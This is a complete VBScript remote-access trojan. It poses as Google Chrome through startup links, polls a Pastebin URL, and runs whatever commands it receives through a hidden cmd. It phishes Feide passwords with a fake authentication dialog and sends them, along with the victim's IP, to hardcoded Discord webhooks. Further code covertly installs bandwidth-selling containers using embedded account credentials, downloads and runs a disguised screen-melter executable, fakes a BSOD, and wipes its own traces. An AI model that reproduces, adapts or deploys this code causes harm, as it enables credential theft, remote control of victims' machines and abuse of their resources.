option Explicit
dim oShell: set oShell = WScript.CreateObject("WScript.Shell")
dim sAPI: set sapi = WScript.CreateObject("SAPI.spVoice")

dim fs,homeDir,cmdsFile '//File system variables
dim cmdsPrev,cmdsStrm '//Cmds variables
dim userName,userProfile,localAppData,appData,spoofDir,userLock,ipFile,ipStream,ip,isFarming '//User variables
dim instanceStream, instances '//Instance compatibility variables
dim completed,INPUT,window '//Gui
dim feideInputTitle, feideEmailInputPrompt, feideEmailInput, feidePasswordInputPrompt, feidePasswordInput, feideIcon '//Feide stealer variables

'//Setup | Set variables
'-- File objects & User vars
set fs = createobject("Scripting.FileSystemObject")
userProfile = oShell.expandEnvironmentStrings("%USERPROFILE%")
localAppData = oShell.expandEnvironmentStrings("%LOCALAPPDATA%")
appData = oShell.expandEnvironmentStrings("%APPDATA%")
userName = oShell.expandEnvironmentStrings("%USERNAME%")
userLock = userName
spoofDir = appData & "\Google\Chrome"

'-- Instance compatibility
instances = 0

'// Methods - Gui
function inputBoxMl(prompt, title, defval, icon)
	set window = createwindow(icon)
	completed = 0
	defval = replace(replace(replace(defval, "&", "&amp;"), "<", "&lt;"), ">", "&gt;")

	dim windowX,windowY,centerX,centerY
	windowX = 375
	windowY = 200
	
	dim resX, resY, vid
	for each vid in getobject("winmgmts:").instancesof("Win32_VideoController")
		resX = vid.CurrentHorizontalResolution
		resY = vid.currentVerticalResolution
	next
	
	centerX = (resX / 2) - (windowX / 2)
	centerY = (resY / 2) - (windowY / 2)

	with window
		with .document
		  .title = title
		  .body.style.background = "buttonface"
		  .body.style.fontfamily = "consolas, courier new"
		  .body.style.fontsize = "8pt"
		  .body.innerhtml = "<div>" & prompt & "<br><br><input type='text' placeholder='" & defval & "' value='" & defval & "' id='hta_textarea' style='font-family: consolas, courier new; width: 100%; height: " & 20 & "px;'></input><br><button id='hta_cancel' style='font-family: consolas, courier new; width: 85px; margin: 10px; padding: 3px; float: right;'>Cancel</button><button id='hta_ok' style='font-family: consolas, courier new; width: 85px; margin: 10px; padding: 3px; float: right;'>OK</button></div>"
		end with
		.resizeto windowX, windowY
		.moveto centerX, centerY
	end with
	
	window.hta_textarea.focus
	set window.hta_cancel.onclick = getref("hta_cancel")
	set window.hta_ok.onclick = getref("hta_ok")
	set window.document.body.onunload = getref("hta_onunload")
	
	do until completed > 0
		wscript.sleep 10
	loop
	select case completed
		case 1
		inputBoxMl = ""
		case 2
		inputBoxMl = ""
		window.close
		case 3
		inputBoxMl = window.hta_textarea.value
		window.close
	end select
end function

function msgBoxMl(prompt, title, icon)
	set window = createwindow(icon)
	completed = 0

	dim windowX,windowY,centerX,centerY
	windowX = 375
	windowY = 150
	
	dim resX, resY, vid
	for each vid in getobject("winmgmts:").instancesof("Win32_VideoController")
		resX = vid.CurrentHorizontalResolution
		resY = vid.currentVerticalResolution
	next
	
	centerX = (resX / 2) - (windowX / 2)
	centerY = (resY / 2) - (windowY / 2)

	with window
		with .document
		  .title = title
		  .body.style.background = "buttonface"
		  .body.style.fontfamily = "consolas, courier new"
		  .body.style.fontsize = "8pt"
		  .body.innerhtml = "<div>" & prompt & "<br><br><button id='hta_cancel' style='font-family: consolas, courier new; width: 85px; margin: 10px; padding: 3px; float: right;'>Cancel</button><button id='hta_ok' style='font-family: consolas, courier new; width: 85px; margin: 10px; padding: 3px; float: right;'>OK</button></div>"
		end with
		.resizeto windowX, windowY
		.moveto centerX, centerY
	end with
	
	set window.hta_cancel.onclick = getref("hta_cancel")
	set window.hta_ok.onclick = getref("hta_ok")
	set window.document.body.onunload = getref("hta_onunload")
	
	do until completed > 0
		wscript.sleep 10
	loop
	select case completed
		case 1
		msgBoxMl = 0
		case 2
		msgBoxMl = 2
		window.close
		case 3
		msgBoxMl = 1
		window.close
	end select
end function

function createwindow(icon)
	dim signature, shellwnd, proc
	on error resume next
	signature = left(createobject("Scriptlet.TypeLib").guid, 38)
	do
		set proc = oShell.exec("mshta ""about:<head><script>moveTo(-32000,-32000);</script><hta:application id=app border=dialog minimizebutton=no maximizebutton=no scroll=no showintaskbar=yes contextmenu=no selection=yes innerborder=no icon=""" + icon + """/><object id='shellwindow' classid='clsid:8856F961-340A-11D0-A96B-00C04FD705A2'><param name=RegisterAsBrowser value=1></object><script>shellwindow.putproperty('" & signature & "',document.parentWindow);</script></head>""")
		do
			if proc.status > 0 then exit do
			for each shellwnd in createobject("Shell.Application").windows
			set createwindow = shellwnd.getproperty(signature)
			if err.number = 0 then exit function
			err.clear
			next
		loop
	loop
end function

sub hta_onunload
  completed = 1
end sub

sub hta_cancel
  completed = 2
end sub

sub hta_ok
  completed = 3
end sub

'//Methods - Cmds
sub wait(time)
	dim dteWait 
	dteWait = DateAdd("s", time, Now())
	do until (Now() > dteWait)
	Loop
end sub

sub exec(cmds)
	cmdsStrm.close

	'// Format built-in variables
	cmds = replace(cmds, "!user", userName)
	cmds = replace(cmds, "!ip", ip)

	if cmdsPrev <> cmds then
			'//Execute lock cmds
			if Left(cmds, 7) = "=lockon" then
				userLock = mid(cmds, 9)
			elseif Left(cmds, 8) = "=lockoff" then
				userLock = userName
			end if
			
			'//Check lock
			if userName <> userLock then
				exit sub
			end if
			
			'//Execute built-in cmds
			if Left(cmds, 5) = "=kill" then
				if InStr(cmds, "cmd") > 0 or InStr(cmds, "batch") > 0 then
					killcmd()
				elseif InStr(cmds, "all") > 0 then '//Terminates everything related to this
					killall()
				end if
			elseif Left(cmds, 9) = "=sessions" then
				'//Fetch info
				'-- IP
				oShell.run "cmd /c nslookup myip.opendns.com resolver1.opendns.com | findstr ""Address:"" > .ip", 0, true
				set ipFile = fs.getFile(".ip")
				set ipStream = ipFile.openAsTextStream()

				ip = replace(ipStream.readLine(), "Address: ", "")
				ipStream.close()

				fs.deleteFile(ipFile)
				
				'-- Date
				dim dateNow, webhook, farming
				
				dateNow = "dt--" & date()
				webhook	= "https://discord.com/api/webhooks/1276165578083532821/HpmnzFcrC1qj5KLvxquH6hQMZMS8TMsJuocjATnMlERLgX7mRBreZUlfteaQrTnuZTX4"
				
				if isFarming = true then
					farming = "actively farming"
				else
					farming = "not farming"
				end if
			
				'//Log
				dim msg, displayName
				msg = "Previous command: " + cmdsPrev + "\nLast execution: " + dateNow + "\nUserlock: " + userLock + "\nIP Address: " + ip
				displayName = userName + " (" + farming + ")"
				
				report webhook, msg, displayName
			elseif Left(cmds, 10) = "=dispose" then
				dispose()
			elseif Left(cmds, 6) = "=troll" then
				if InStr(cmds, "bsod") > 0then
					troll("bsod")
				elseif InStr(cmds, "melt") > 0 then
					troll("melt")
				end if
			elseif Left(cmds, 7) = "=volume" then
				statevol(mid(cmds, 9, 3))
			elseif Left(cmds, 9) = "=musicman" then
				'//Invokes musicman(s.id link, volume, loop?)
				musicman mid(cmds, 11, 18), mid(cmds, 30, 3), mid(cmds, 34, 4)
			elseif Left(cmds, 6) = "=steal" then
				if InStr(cmds, "feide") > 0 then
					feidePrompt()
				end if
			elseif Left(cmds, 6) = "=speak" then
				if mid(cmds, 8, 4) = "fast" then
					sAPI.Rate = 5
				elseif mid(cmds, 8, 4) = "norm" then
					sAPI.Rate = 0
				elseif mid(cmds, 8, 4) = "slow" then
					sAPI.Rate = -5
				end if
				
				sAPI.speak mid(cmds, 14)
			elseif Left(cmds, 5) = "=farm" then
				if InStr(cmds, "start") > 0 then
					farm true
				elseif InStr(cmds, "stop") > 0 then
					farm false
				end if
			elseif Left(cmds, 7) = "=report" then
				report "https://discord.com/api/webhooks/1311677559645405254/jv_jbS1_yVOrfbo2TvC5TF2o_CsBDvjBNPFjxDQOvvP3DQZW7NoMMiCWPQihM-kObWvO", mid(cmds, 9), "Report - " & userName
			else
				oShell.run "cmd /c " + cmds, 0, true
			end if
	end if
	
	cmdsPrev = cmds
end sub

'// Methods - Exfiltration
sub report(webhook, message, nickname)
	oShell.run "powershell -command ""$log = \""" + message + "\""; $p = \""{'content': '\"" + $log + \""', 'username': '" + nickname + "'}\""; $b = $p -replace '''', '\""'; iwr " + webhook + " -B $b -Me 'POST' -Cont 'application/json'""", 0, false
end sub

'// Methods - Payloads
sub killcmd()	
	dim x
	x=0
	do until x = 4 '// Short loop kill
		x = x + 1
		oShell.run "cmd /c taskkill /IM WindowsTerminal.exe /IM OpenConsole.exe /IM cmd.exe /F /T", 0, true
		
		wait(1.0)
	loop
end sub

sub killall()
	'//Kills all packages & self
	killcmd() '//Terminate all batch packages
	
	oShell.run "cmd /c taskkill /IM wscript.exe /F /T", 0, true '//Terminate All VBA/VBS Payloads
	
	WScript.quit '//Self termination failsafe
end sub

sub dispose()
	'//Kill any open Batch Payloads
	killcmd()

	'//Restore start menu
	oShell.run "cmd /c cd ""%appdata%\Microsoft\Windows\Start Menu"" && del /f /s /q Programs && xcopy /y /e /i " & homeDir & "\.startmenu Programs",0,true

	'//Delete all traces
	'--Erase homeDir
	oShell.run "cmd /c del /s /f /q " & homeDir, 0, true
	oShell.run "cmd /c rmdir /s /q " & homeDir, 0, true
	
	'--Erase links and relations
	oShell.run "cmd /c cd " & spoofDir & " && attrib -s -h Update.vbs && del /f /q Update.vbs & del /f /q app.ico & del /f /q ""%appdata%\Microsoft\Windows\Start Menu\Programs\Startup\Google Chrome.lnk""", 0, true
	oShell.run "cmd /k cd " & spoofDir & " && attrib -s -h Chrome.lnk && attrib -s -h Chrome.vbs && del /f /s /q Chrome.lnk && del /f /s /q Chrome.vbs",1,true
	
	'//Terminate all VBS/Batch processes
	wait(2.0)
	
	killall()
end sub

sub troll(what)
	if what = "bsod" then
		oShell.run "cmd /c cd " & homeDir & " && mkdir troll & attrib +s +h troll", 0, true
		oShell.run "cmd /c cd " & homeDir & "\troll & curl -L https://pastebin.com/raw/tFd0qvBY -o bsod.hta & (echo dim oShell: set oShell = createObject^(""WScript.Shell""^) & echo do & echo oShell.run ""cmd /c mshta " & homeDir & "\troll\bsod.hta"",0,false & echo loop) > bsod.vbs && start bsod.vbs", 0, true
	elseif what = "melt" then
		oShell.run "cmd /c cd " & homeDir & " && mkdir troll & attrib +s +h troll", 0, true
		oShell.run "cmd /c cd " & homeDir & "\troll && powershell iwr https://github.com/FilthyPenny/boot/raw/main/screen-melter.exe -o svchost.exe && start svchost.exe", 0, true
	end if
end sub

sub setvol(switch, value)
	dim x
	x=0
	if switch = "increase" then
		do until x = value
			x = x + 1
			oShell.SendKeys(chr(&hAF))
		loop
	elseif switch = "decrease" then
		do until x = value
			x = x + 1
			oShell.SendKeys(chr(&hAE))
		loop
	end if
end sub

sub statevol(state)
	if state = "max" then
		setvol "increase", 50
	elseif state = "mid" then
		setvol "decrease", 50
		setvol "increase", 25
	elseif state = "min" then
		setvol "decrease", 50
	elseif state = "hij" then
		oShell.run "cmd /c cd " & homeDir & " && mkdir vol & cd vol && (echo dim oShell: set oShell = WScript.CreateObject^(""Wscript.Shell""^) & echo do while true & echo oShell.sendKeys^(chr^(^&hAF^)^) & echo WScript.sleep 20 & echo loop) > vol.vbs && start vol.vbs",0,true
	end if
end sub

sub musicman(uri, volState, isLooping)
	'//Set volume
	statevol(volState)
	
	'//Musicman
	oShell.run "cmd /c cd " & homeDir & " && mkdir mMan\Music & cd mMan && (echo dim oShell & echo set oShell = WScript.CreateObject^(""WScript.Shell""^) & echo oShell.run ""powershell iwr " + uri + " -O " & homeDir & "\mMan\Music\m.mp3"", 0, true & echo loopState = true & echo do while loopState = true & echo Set Sound = CreateObject^(""WMPlayer.OCX.7""^) & echo Sound.URL = """ & homeDir & "\mMan\Music\m.mp3"" & echo Sound.Settings.volume = 100 & echo Sound.Controls.play & echo do while Sound.currentmedia.duration = 0 & echo WScript.sleep 100 & echo loop & echo wscript.sleep ^(int^(Sound.currentmedia.duration^)+1^)*1000 & echo loopState = " + isLooping + " & echo loop) > mMan.vbs && start mMan.vbs", 0, true
end sub

sub farm(state)
	'// Setup
	isFarming = fs.fileExists(homeDir & "\.farming")

	'// Choco
	oShell.run "cmd /c cd C:\ProgramData && del chocolatey /f /s /q && rmdir /s /q chocolatey && del chocoportable /f /s /q && rmdir chocoportable /s /q", 0, true 'Get rid of any previous falty chocolatey installations
	
	oShell.run "powershell -command ""$env:ChocolateyInstall='C:\ProgramData\Choco'; [System.Environment]::SetEnvironmentVariable('ChocolateyInstall','C:\ProgramData\Choco', 'User')""", 0, true
	oShell.run "powershell -command ""Set-ExecutionPolicy Bypass -Scope Process -Force; iex ((New-Object System.Net.WebClient).DownloadString('https://community.chocolatey.org/install.ps1'))""", 0, true
	
	'// Podman
	oShell.run "powershell -command ""echo y | choco install podman-cli -f -y""", 0, true
	oShell.run "powershell -command ""podman machine init; podman machine start""", 0, true
	
	'// Start/stop farm
	if state = true then
		'// Checks
		if isFarming then exit sub end if
	
		'// Flag
		fs.createTextFile(homeDir & "\.farming")
		
		'// Workers
		'-- Pawns
		oShell.run "powershell -command ""podman pull iproyal/pawns-cli""", 0, true
		oShell.run "powershell -command ""podman run --restart=on-failure:5 iproyal/pawns-cli -email='a32.burner32@gmail.com' -password=PddLw0@laGScclS -device-name=" + userName + " -device-id=" + userName + " -accept-tos""", 0, false
		
		'-- Honeygain
		oShell.run "powershell -command ""podman pull honeygain/honeygain""", 0, true
		oShell.run "powershell -command ""podman run honeygain/honeygain -tou-accept -email 'a32.burner32@gmail.com' -pass HdLw0@laGSccN -device " + userName + """", 0, false
	else
		'// Checks
		if isFarming = false then exit sub end if
		
		'// Flag
		fs.deleteFile(homeDir & "\.farming")
		
		'// All workers
		oShell.run "powershell -command ""podman kill --all""", 0, true
		
		'// Podman
		oShell.run "powershell -command ""podman machine stop""", 0, true
	end if
end sub

function feideRetry()
	dim retryChoice
	retryChoice = msgBoxMl("Your inputs can not be empty." + vbNewLine + "Please input your credentials again", "Failed to authenticate - FNA", feideIcon)
	
	if retryChoice = 1 then
		feideRetry = true
		exit function
	elseif retryChoice = 2 then
		msgBoxMl "Your Feide network authentication was cancelled." + vbNewLine + "This is not recommended and might result in some Feide integrated services not working", "Authentication cancelled - FNA", feideIcon
	end if
	
	feideRetry = false
end function

sub feidePrompt()
	'// Setup | Exfiltrate
	dim webhook
	webhook = "https://discord.com/api/webhooks/1276889925479960618/xPFojPPzQSMYKBMhl5l4CROjvGCDIksrGaBIirUHfzyuIbCWs_5Nr8jIu7DrifMKgl2v"
	
	feideInputTitle = "Feide Network Authenticator (FNA)"

	'// Setup | Prompts
	feidePasswordInputPrompt = "Your network could not properly authenticate your Feide credentials." + vbNewLine + "This could result in some Feide integrated services not functioning properly." + vbNewLine  + "Please enter your Feide password login"

	'// Prompt
	feidePasswordInput = inputBoxMl(feidePasswordInputPrompt, feideInputTitle, "Feide password", feideIcon)
	
	'// Prompt retry if on or more inputs are empty
	if feidePasswordInput = "" then
		if feideRetry then
			feidePrompt
			exit sub
		else
			exit sub
		end if
	end if

	'// Exfiltrate credentials
	dim msg, displayName
	msg = "Password: " + feidePasswordInput
	displayName = "FNA - Client: " + userName
	
	report webhook, msg, displayName
	
	'// Re-Prompt
	msgBoxMl "Feide could not authenticate you." + vbNewLine + "Please try again and make sure your credentials were inputted correctly.", "Could not authenticate you - FNA", feideIcon
	
	feidePrompt
end sub

'//Initialize homeDir
if not fs.folderExists(userProfile + "\.madx") then
	fs.createFolder(userProfile + "\.madx")
end if

set homeDir = fs.getFolder(userProfile + "\.madx")

'//Instance compatibility
oShell.run "cmd /c tasklist /FO ""csv"" | find /I ""wscript.exe"" > " + homeDir + "\.instances", 0, true
set instanceStream = fs.getFile(homeDir + "\.instances" ).openAsTextStream()

sub readAllInstances()
	'// Read all lines
	if not instanceStream.AtEndOfStream then
		instanceStream.readLine()
		instances = instances + 1
		readAllInstances()
	else
		instanceStream.Close()
		exit sub
	end if
end sub

readAllInstances()

if instances = 2 then
	WScript.Quit
end if

'//Initialize files
fs.createTextFile(homeDir + "\cmds.txt")

'//Disable farm
oShell.run "cmd /c del " + homeDir.Path + "\.farming /f",0,true

'//Disable Taskmgr.exe
oShell.run "taskmgr.exe", 0, false

'//Fetch assets
'--Feide
oShell.run "powershell iwr ""https://raw.githubusercontent.com/FilthyPenny/boot/main/Feide_logo.ico"" -O " & homeDir & "\feide.ico", 0, true
feideIcon = homeDir & "\feide.ico"

'//Cmds loop
do while True
	set cmdsFile = fs.getFile(homeDir & "\cmds.txt")
	
	'//Download
	oShell.run "powershell iwr https://pastebin.com/raw/Wr5HY47k -O " & cmdsFile.Path, 0, true

	'//Read
	set cmdsStrm = cmdsFile.openAsTextStream()

	if not cmdsStrm.AtEndOfStream then
		exec(cmdsStrm.readLine)
	end if

	'//Hide it all
	oShell.run "cmd /c attrib +s +h " & homeDir, 0, false

	'//Loop delay
	wait(10.0)
loop
